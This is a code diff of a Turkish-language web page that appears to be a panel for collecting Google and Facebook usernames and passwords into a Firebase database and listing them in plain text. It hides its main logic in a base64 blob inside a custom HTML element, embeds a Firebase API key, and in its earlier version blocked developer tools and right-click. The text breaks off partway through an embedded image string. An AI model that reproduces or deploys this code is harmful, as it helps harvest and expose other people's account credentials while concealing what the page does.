@@ -9,10 +9,11 @@
         .container { max-width: 450px; margin: auto; }
         #dataList, #msgList { margin-bottom: 20px; max-height: 300px; overflow-y: auto; }
         .mesaj-kutusu { background: white; padding: 15px; border-radius: 8px; margin-bottom: 10px; border-left: 5px solid #5c67f2; display: flex; align-items: center; gap: 15px; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
+        .mesaj-kutusu.bot-mesaj { background: #f2e8f8; border-left-color: #d048f6; }
         .mesaj-kutusu img { width: 30px; }
         .info { flex: 1; line-height: 1.6; }
         .del-btn { max-width: 50px; background: #ff4d4d; color: white; border: none; padding: 5px 10px; border-radius: 4px; cursor: pointer; font-size: 12px; }
-        .panel { background: white; padding: 20px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); margin-bottom: 20px; }
+        .panel { background: white; padding: 20px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); margin-bottom: 20px; position: relative; }
         .logo-group { display: flex; gap: 10px; margin-bottom: 15px; }
         .platform-btn { flex: 1; padding: 10px; border: 2px solid #ddd; border-radius: 8px; cursor: pointer; text-align: center; transition: 0.3s; }
         .platform-btn img { width: 24px; vertical-align: middle; }
@@ -24,6 +25,38 @@
         button { flex: 1; padding: 12px; background: #5c67f2; color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; }
         .multi-btn { background: #27ae60; }
         .chat-input { display: flex; flex-direction: row; justify-content: center; align-items: center; gap: 5px; margin-top: 10px; }
+
+        /* Sağ üst küçük sembol buton tasarımı */
+        .settings-toggle-btn {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: #34495e;
+            color: white;
+            border: none;
+            width: 36px;
+            height: 36px;
+            /*border-radius: 50%;*/
+            cursor: pointer;
+            font-size: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 0;
+            /*flex: initial;*/
+            z-index: 10;
+        }
+        .settings-content { display: none; margin-bottom: 15px; border-top: 1px solid #eee; padding-top: 15px;  }
+        .settings-content.open { display: block; }
+        .platform-toggle-grid { width: 100%; display: grid; grid-template-columns: repeat(2, 1fr); gap: 8px; }
+        .toggle-item { display: flex; align-items: center; justify-content: space-between; padding: 8px 12px; border: 1px solid #ddd; border-radius: 6px; background: #fafafa; font-size: 13px; }
+        .toggle-item img { width: 18px; vertical-align: middle; margin-right: 5px; }
+        .switch { position: relative; display: inline-block; width: 34px; height: 20px; }
+        .switch input { opacity: 0; width: 0; height: 0; }
+        .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #ccc; transition: .3s; border-radius: 20px; }
+        .slider:before { position: absolute; content: ""; height: 12px; width: 12px; left: 4px; bottom: 4px; background-color: white; transition: .3s; border-radius: 50%; }
+        input:checked + .slider { background-color: #27ae60; }
+        input:checked + .slider:before { transform: translateX(14px); }
     </style>
 </head>
 <body>
@@ -32,6 +65,15 @@
     <h3 style="text-align: center;">Hesaplar (<span id="accCount">0</span>)</h3>
     <div id="dataList"></div>
     <div class="panel">
+        <!-- Sadece sembol olan küçük sağ üst buton ve ayarlar -->
+        <button id="toggleSettingsBtn" class="settings-toggle-btn" title="Ayarlar">⚙️</button>
+        <div id="settingsPanel" class="settings-content">
+            <h4 style="margin: 0 0 10px 0; font-size: 14px;">Uygulama Durumları</h4>
+            <div class="platform-toggle-grid" id="platformToggleGrid">
+                <!-- Dinamik logolar ve aktiflik anahtarları buraya gelecek -->
+            </div>
+        </div>
+
         <h3>Hesap Girişi</h3>
         <div class="logo-group">
             <div class="platform-btn active" id="btnGoogle" onclick="selectPlatform('Google')">
@@ -64,6 +106,7 @@
         <div class="btn-container">
             <button id="sendBtn">Gönder</button>
             <button id="sendMultiBtn" class="multi-btn">Hepsine Gönder</button>
+            <button onclick="quasarTest()">Test</button>
         </div>
         <div class="chat-input">
             <input type="text" id="chatMsg" placeholder="Mesaj yaz...">
@@ -74,53 +117,222 @@
     <div id="msgList"></div>
 </div>
 
-<quasar-logic data-secret="ICAgIGNvbnN0IGZpcmViYXNlQ29uZmlnID0gewogICAgICAgIGFwaUtleTogIkFJemFTeUJWN2p0b1hQQmNQZGNsY0JzZU9LMzl3SnNTWFV4THBnNCIsCiAgICAgICAgZGF0YWJhc2VVUkw6ICJodHRwczovL2F0YW1vc3NvY2tldC1kZWZhdWx0LXJ0ZGIuZmlyZWJhc2Vpby5jb20iLAogICAgICAgIHByb2plY3RJZDogImF0YW1vc3NvY2tldCIKICAgIH07CiAgICBjb25zdCBkYiA9IGdldERhdGFiYXNlKGluaXRpYWxpemVBcHAoZmlyZWJhc2VDb25maWcpKTsKICAgIGNvbnN0IGRhdGFSZWYgPSByZWYoZGIsICdoZXNhcGxhcicpOwogICAgY29uc3QgbXNnUmVmID0gcmVmKGRiLCAnbWVzYWpsYXInKTsKICAgIG9uVmFsdWUoZGF0YVJlZiwgKHNuYXBzaG90KSA9PiB7CiAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2FjY0NvdW50JykuaW5uZXJUZXh0ID0gc25hcHNob3Quc2l6ZSB8fCAwOwogICAgfSk7CiAgICB3aW5kb3cuc2VsZWN0UGxhdGZvcm0gPSAocCkgPT4gewogICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzZWxlY3RlZFBsYXRmb3JtJykudmFsdWUgPSBwOwogICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdidG5Hb29nbGUnKS5jbGFzc05hbWUgPSBwID09PSAnR29vZ2xlJyA/ICdwbGF0Zm9ybS1idG4gYWN0aXZlJyA6ICdwbGF0Zm9ybS1idG4nOwogICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdidG5GYWNlYm9vaycpLmNsYXNzTmFtZSA9IHAgPT09ICdGYWNlYm9vaycgPyAncGxhdGZvcm0tYnRuIGFjdGl2ZScgOiAncGxhdGZvcm0tYnRuJzsKICAgIH07CiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc2VuZEJ0bicpLm9uY2xpY2sgPSAoKSA9PiB7CiAgICAgICAgY29uc3QgdSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd1c2VybmFtZUlucHV0JykudmFsdWU7CiAgICAgICAgY29uc3QgZCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdkb21haW5TZWxlY3QnKS52YWx1ZTsKICAgICAgICBjb25zdCBwID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Bhc3N3b3JkSW5wdXQnKS52YWx1ZTsKICAgICAgICBpZighdSB8fCAhcCkgcmV0dXJuIGFsZXJ0KCJBbGFubGFyxLEgYm/FnyBixLFyYWttYSEiKTsKICAgICAgICBwdXNoKGRhdGFSZWYsIHsgcGxhdGZvcm06IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzZWxlY3RlZFBsYXRmb3JtJykudmFsdWUsIHVzZXI6IHUgKyBkLCBwYXNzOiBwLCB0aW1lOiBuZXcgRGF0ZSgpLnRvTG9jYWxlVGltZVN0cmluZygpIH0pOwogICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd1c2VybmFtZUlucHV0JykudmFsdWUgPSAnJzsKICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncGFzc3dvcmRJbnB1dCcpLnZhbHVlID0gJyc7CiAgICB9OwogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3NlbmRNdWx0aUJ0bicpLm9uY2xpY2sgPSAoKSA9PiB7CiAgICAgICAgY29uc3QgdSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd1c2VybmFtZUlucHV0JykudmFsdWU7CiAgICAgICAgY29uc3QgZCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdkb21haW5TZWxlY3QnKS52YWx1ZTsKICAgICAgICBjb25zdCBwID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Bhc3N3b3JkSW5wdXQnKS52YWx1ZTsKICAgICAgICBpZighdSB8fCAhcCkgcmV0dXJuIGFsZXJ0KCJBbGFubGFyxLEgYm/FnyBixLFyYWttYSEiKTsKICAgICAgICBwdXNoKGRhdGFSZWYsIHsgcGxhdGZvcm06ICdHb29nbGUnLCB1c2VyOiB1ICsgZCwgcGFzczogcCwgdGltZTogbmV3IERhdGUoKS50b0xvY2FsZVRpbWVTdHJpbmcoKSB9KTsKICAgICAgICBwdXNoKGRhdGFSZWYsIHsgcGxhdGZvcm06ICdGYWNlYm9vaycsIHVzZXI6IHUgKyBkLCBwYXNzOiBwLCB0aW1lOiBuZXcgRGF0ZSgpLnRvTG9jYWxlVGltZVN0cmluZygpIH0pOwogICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd1c2VybmFtZUlucHV0JykudmFsdWUgPSAnJzsKICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncGFzc3dvcmRJbnB1dCcpLnZhbHVlID0gJyc7CiAgICB9OwogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3NlbmRDaGF0QnRuJykub25jbGljayA9ICgpID0+IHsKICAgICAgICBjb25zdCBtc2cgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnY2hhdE1zZycpLnZhbHVlOwogICAgICAgIGlmKCFtc2cpIHJldHVybjsKICAgICAgICBwdXNoKG1zZ1JlZiwgeyB0ZXh0OiBtc2csIHRpbWU6IG5ldyBEYXRlKCkudG9Mb2NhbGVUaW1lU3RyaW5nKCkgfSk7CiAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2NoYXRNc2cnKS52YWx1ZSA9ICcnOwogICAgfTsKICAgIG9uQ2hpbGRBZGRlZChkYXRhUmVmLCAoZGF0YSkgPT4gewogICAgICAgIGNvbnN0IHYgPSBkYXRhLnZhbCgpOwogICAgICAgIGNvbnN0IGxvZ28gPSB2LnBsYXRmb3JtID09PSAnR29vZ2xlJyA/ICdodHRwczovL3VwbG9hZC53aWtpbWVkaWEub3JnL3dpa2lwZWRpYS9jb21tb25zL2MvYzEvR29vZ2xlXyUyMkclMjJfbG9nby5zdmcnIDogJ2h0dHBzOi8vdXBsb2FkLndpa2ltZWRpYS5vcmcvd2lraXBlZGlhL2NvbW1vbnMvNS81MS9GYWNlYm9va19mX2xvZ29fJTI4MjAxOSUyOS5zdmcnOwogICAgICAgIGNvbnN0IGRpdiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOwogICAgICAgIGRpdi5jbGFzc05hbWUgPSAnbWVzYWota3V0dXN1JzsKICAgICAgICBkaXYuaWQgPSBkYXRhLmtleTsKICAgICAgICBkaXYuaW5uZXJIVE1MID0gYAogICAgICAgIDxpbWcgc3JjPSIke2xvZ299Ij4KICAgICAgICA8ZGl2IGNsYXNzPSJpbmZvIj4KICAgICAgICAgICAgPHN0cm9uZyBxdWFzYXItcGxhdGZvcm09IiR7di5wbGF0Zm9ybX0iPiR7di5wbGF0Zm9ybX08L3N0cm9uZz48YnI+CiAgICAgICAgICAgIDxzcGFuIGNsYXNzPSJxLXVzZXJOYW1lIj4ke3YudXNlcn08L3NwYW4+PGJyPgogICAgICAgICAgICA8c3BhbiBjbGFzcz0icS1wYXNzd29yZCI+JHt2LnBhc3N9PC9zcGFuPgogICAgICAgIDwvZGl2PgogICAgICAgIDxidXR0b24gY2xhc3M9ImRlbC1idG4iIG9uY2xpY2s9InJlbW92ZURhdGEoJyR7ZGF0YS5rZXl9JykiPlNpbDwvYnV0dG9uPgogICAgYDsKICAgICAgICBjb25zdCBsaXN0ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2RhdGFMaXN0Jyk7CiAgICAgICAgY29uc3Qgb2xkRmlyc3QgPSBsaXN0LnF1ZXJ5U2VsZWN0b3IoJy5maXJzdC1pdGVtJyk7CiAgICAgICAgaWYgKG9sZEZpcnN0KSBvbGRGaXJzdC5jbGFzc0xpc3QucmVtb3ZlKCdmaXJzdC1pdGVtJyk7CiAgICAgICAgZGl2LmNsYXNzTGlzdC5hZGQoJ2ZpcnN0LWl0ZW0nKTsKICAgICAgICBsaXN0LnByZXBlbmQoZGl2KTsKICAgIH0pOwogICAgb25DaGlsZFJlbW92ZWQoZGF0YVJlZiwgKGRhdGEpID0+IHsKICAgICAgICBjb25zdCBlbGVtZW50ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoZGF0YS5rZXkpOwogICAgICAgIGlmIChlbGVtZW50KSB7CiAgICAgICAgICAgIGVsZW1lbnQucmVtb3ZlKCk7CiAgICAgICAgfQogICAgfSk7CiAgICBvbkNoaWxkQWRkZWQobXNnUmVmLCAoZGF0YSkgPT4gewogICAgICAgIGNvbnN0IGRpdiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOwogICAgICAgIGRpdi5jbGFzc05hbWUgPSAnbWVzYWota3V0dXN1JzsKICAgICAgICBkaXYuc3R5bGUuYm9yZGVyTGVmdENvbG9yID0gJyMyN2FlNjAnOwogICAgICAgIGRpdi5pbm5lckhUTUwgPSBgPGRpdiBjbGFzcz0iaW5mbyI+TWVzYWo6ICR7ZGF0YS52YWwoKS50ZXh0fSA8YnI+PHNtYWxsPiR7ZGF0YS52YWwoKS50aW1lfTwvc21hbGw+PC9kaXY+YDsKICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbXNnTGlzdCcpLnByZXBlbmQoZGl2KTsKICAgIH0pOwogICAgd2luZG93LnJlbW92ZURhdGEgPSAoa2V5KSA9PiB7CiAgICAgICAgcmVtb3ZlKHJlZihkYiwgJ2hlc2FwbGFyLycgKyBrZXkpKTsKICAgIH07CmNvbnN0IGZ1bmN0aW9ucyA9IHJlcXVpcmUoJ2ZpcmViYXNlLWZ1bmN0aW9ucycpOwpjb25zdCBhZG1pbiA9IHJlcXVpcmUoJ2ZpcmViYXNlLWFkbWluJyk7CmFkbWluLmluaXRpYWxpemVBcHAoKTsKCmV4cG9ydHMuY2xlYXJNZXNzYWdlcyA9IGZ1bmN0aW9ucy5wdWJzdWIuc2NoZWR1bGUoJ2V2ZXJ5IDEgaG91cnMnKS5vblJ1bihhc3luYyAoY29udGV4dCkgPT4gewogICAgY29uc3QgbXNnUmVmID0gYWRtaW4uZGF0YWJhc2UoKS5yZWYoJ21lc2FqbGFyJyk7CiAgICB0cnkgewogICAgICAgIGF3YWl0IG1zZ1JlZi5yZW1vdmUoKTsKICAgICAgICBjb25zb2xlLmxvZygiTWVzYWpsYXIgYmHFn2FyxLF5bGEgdGVtaXpsZW5kaS4iKTsKICAgIH0gY2F0Y2ggKGVycm9yKSB7CiAgICAgICAgY29uc29sZS5lcnJvcigiU2lsbWUgaGF0YXPEsToiLCBlcnJvcik7CiAgICB9CiAgICByZXR1cm4gbnVsbDsKfSk7"></quasar-logic>
 
 <script id="engine-script" type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
-    import { getDatabase, ref, push, onChildAdded, onValue, remove, onChildRemoved } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js";
+    import { getDatabase, ref, push, onChildAdded, onValue, remove, onChildRemoved, set } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js";
 
     window.getDatabase = getDatabase;
     window.ref = ref;
     window.push = push;
+    window.set = set;
     window.onChildAdded = onChildAdded;
     window.onValue = onValue;
     window.remove = remove;
     window.onChildRemoved = onChildRemoved;
     window.initializeApp = initializeApp;
 
-    document.addEventListener('contextmenu', event => event.preventDefault());
+    const firebaseConfig = {
+        apiKey: "AIzaSyBV7jtoXPBcPdclcBseOK39wJsSXUxLpg4",
+        databaseURL: "https://atamossocket-default-rtdb.firebaseio.com",
+        projectId: "atamossocket"
+    };
+    const db = getDatabase(initializeApp(firebaseConfig));
+    const dataRef = ref(db, 'hesaplar');
+    const msgRef = ref(db, 'mesajlar');
+    const settingsRef = ref(db, 'ayarlar/platformlar');
 
-    document.onkeydown = function(e) {
-        if (e.keyCode == 123 || // F12
-            (e.ctrlKey && e.shiftKey && e.keyCode == 73) ||
-            (e.ctrlKey && e.shiftKey && e.keyCode == 74) ||
-            (e.ctrlKey && e.keyCode == 85)) {
-            return false;
-        }
+    const settingsPlatforms = {
+        Litmach: { logo: 'https://cdn.aptoide.com/imgs/2/3/a/23ab121f6b622276ac8d7643edac2079_icon.png', active: true },
+        Somatch: { logo: 'data:image/png;base64,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